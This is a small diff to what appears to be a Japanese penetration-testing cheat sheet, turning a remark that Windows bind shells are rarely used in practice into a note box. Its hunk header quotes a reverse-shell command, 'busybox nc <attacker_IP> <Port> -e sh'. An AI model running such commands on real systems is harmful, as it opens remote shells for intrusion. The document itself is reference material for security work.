@@ -146,7 +146,8 @@ busybox nc <attacker_IP> <Port> -e sh
 
 ### Bind Shell for Windows
 
-実践ではほとんど使わない
+> [!NOTE]
+> 実践ではほとんど使わない。
 
 1. ターゲットマシン上リスターを用意
 ```cmd
